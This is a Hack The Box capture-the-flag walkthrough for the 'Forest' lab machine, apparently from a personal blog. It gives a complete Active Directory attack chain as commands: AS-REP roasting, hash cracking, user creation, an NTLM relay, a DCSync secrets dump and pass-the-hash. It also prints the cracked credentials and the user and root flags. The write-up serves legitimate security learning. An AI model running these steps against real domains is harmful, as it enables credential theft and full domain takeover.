---
title:  "Hack The Box - Forest"
date:   2020-03-19
categories: [ctf]
tags: [linux, Active Directory, Kali, Pentest, writeups, ctf]
---
My write-up / walktrough for Forest on Hack The Box. 

# Quick summary
Today, Forest got retired and I'm allowed to publish my write-up. Forest is my second box on HTB, so still pleeeeenty of new things to learn for me ;-)

I added the box to `/etc/hosts` as `forest.htb` with it's ip `10.10.10.161`

![forest](/images/forest/forest.png)

# Enumeration
I started with 
`nmap -sV -p 1-10000 -T5 forest.htb` and revealed plenty of open ports. Well, as the box-name allready mentioned, there is an Active Directory running on it.

![nmap](/images/forest/nmap.png)

So let's try to gather some usernames. I used `legion`, added `forest.htb` as the only host to it and let it run. After a while, `smbenum` gave me the following user:

```
user:[Administrator] rid:[0x1f4]
user:[Guest] rid:[0x1f5]
user:[krbtgt] rid:[0x1f6]
user:[DefaultAccount] rid:[0x1f7]
user:[$331000-VK4ADACQNUCA] rid:[0x463]
user:[SM_2c8eef0a09b545acb] rid:[0x464]
user:[SM_ca8c2ed5bdab4dc9b] rid:[0x465]
user:[SM_75a538d3025e4db9a] rid:[0x466]
user:[SM_681f53d4942840e18] rid:[0x467]
user:[SM_1b41c9286325456bb] rid:[0x468]
user:[SM_9b69f1b9d2cc45549] rid:[0x469]
user:[SM_7c96b981967141ebb] rid:[0x46a]
user:[SM_c75ee099d0a64c91b] rid:[0x46b]
user:[SM_1ffab36a2f5f479cb] rid:[0x46c]
user:[HealthMailboxc3d7722] rid:[0x46e]
user:[HealthMailboxfc9daad] rid:[0x46f]
user:[HealthMailboxc0a90c9] rid:[0x470]
user:[HealthMailbox670628e] rid:[0x471]
user:[HealthMailbox968e74d] rid:[0x472]
user:[HealthMailbox6ded678] rid:[0x473]
user:[HealthMailbox83d6781] rid:[0x474]
user:[HealthMailboxfd87238] rid:[0x475]
user:[HealthMailboxb01ac64] rid:[0x476]
user:[HealthMailbox7108a4e] rid:[0x477]
user:[HealthMailbox0659cc1] rid:[0x478]
user:[sebastien] rid:[0x479]
user:[lucinda] rid:[0x47a]
user:[svc-alfresco] rid:[0x47b]
user:[andy] rid:[0x47e]
user:[mark] rid:[0x47f]
user:[santi] rid:[0x480]
```

# ASRepRoast
So let's look if one ore more users don't need preauthentication. I saved just the usernames in a textfile `user.txt`

![usernames](/images/forest/usernames.png)

and ran `sudo python3 /usr/local/bin/GetNPUsers.py -dc-ip 10.10.10.161 -no-pass -usersfile user.txt htb.local/
` from impacket. (a great toolset, btw)

![asreproast](/images/forest/asreproast.png)
Yeah! There is the user `svc-alfresco` where I could gather a ticket of.

`GetNPUsers.py` can create a well formated file right away by passing the parameter `-format hashcat -outputfile userhash.txt`

# crack the hash

Done so, I could afterwards crack the hash with `hashcat -m18200 --force userhash.txt  /usr/share/wordlists/rockyou.txt` which gives me the credentials `svc-alfresco:s3rvice`

![hashcat](/images/forest/hashcat.png)

# Own the user...

this credentials, I could use to establish a connection with winrm (`evil-winrm -i forest.htb -u svc-alfresco -p s3rvice
`) and grab the user-flag `e5e4e47ae7022664cda6eb013fb0d9ed`.

![userflag](/images/forest/userflag.png)

# Privilege escalation

Tried with `winPEASany.exe` to escalate privilegies. The command
`evil-winrm -i forest.htb -u svc-alfresco -p s3rvice -e .` , `menue` and `Invoke-Binary winPEASany.exe` started the process to scan forest.htb.local, but apart of some missconfiguration (disabled firewall and so on) this was a loose end to me.

## Bloodhound
I then took a deeper look into the Active Directory by gathering and displaying data for `Bloodhound` 

![bloodhound](/images/forest/bloodhound.png)

Done so, I noticed that `svc-alfresco` has the right to create user in the Active Directory. May be, I can create a user and escalate it's privilege?

![accoutoperator](/images/forest/accountoperator.png)

## User creation
To do that, I reconnected with `evil-winrm -i forest.htb -u svc-alfresco -p s3rvice` to the victim and executed there the following commands:
``` cmd
net user fab asdfasdf81 /ADD /DOMAIN
net group "Exchange Trusted Subsystem" fab /add
net group "Exchange Windows Permissions" fab /add 
```

## Dump the secrets
Now, I could try to escalate the privilegies of the new user `fab` so that I afterwards could start a `dcsync-attack`.Therefore, I used the tools `secretsdump.py` and `ntlmrelayx.py`, both from `impacket`.

First, I had to start `sudo python3 /usr/local/bin/ntlmrelayx.py -t ldap://10.10.10.161 --escalate-user fab` and then authenticate the user by inserting the credentials on the local server. 
![ntlmrelay](/images/forest/ntlmrelaywerver.png)

![ntlmweb](/images/forest/ntlmrelayweb.png)

This started allready the necessary privilege escalation, so that I afterwards could make use of the `dcsync-attack` by executing `sudo python3 /usr/local/bin/secretsdump.py HTB.LOCAL/fab:asdfasdf81@10.10.10.161 -just-dc`

![secretdump](/images/forest/secretdump.png)

# Root the box

All I had to do now, was to execute a `pass the hash attack` which could be done again with `evil-winrm`:

`evil-winrm -i forest.htb -u administrator -H 32693b11e6aa90eb43d32c72a07ceea6` 

and then grab the root-flag `f048153f202bbb2f82622b04d79129cc` on admins desktop.

![root](/images/forest/root.png)

# Conclusion 
- still a lot to learn about Kerberos and Active Directory
- not sure, how *noisy* my attacks were?
- should once (or more) dig into the scripts I'm using, for better understandig of attack and defense
- box was a great pleasure :-)
- lost a lot of time due the fact, that the box got messed up in a way. Next time reset the box instead of retrying, retrying retrying....
- and finally: **Thanks** and respect to [Hack The Box](https://www.hackthebox.eu/) for providing this great box and to [tundr4](https://www.hackthebox.eu/home/users/profile/158160) for helping me out as I got stuck with privilege escalation.
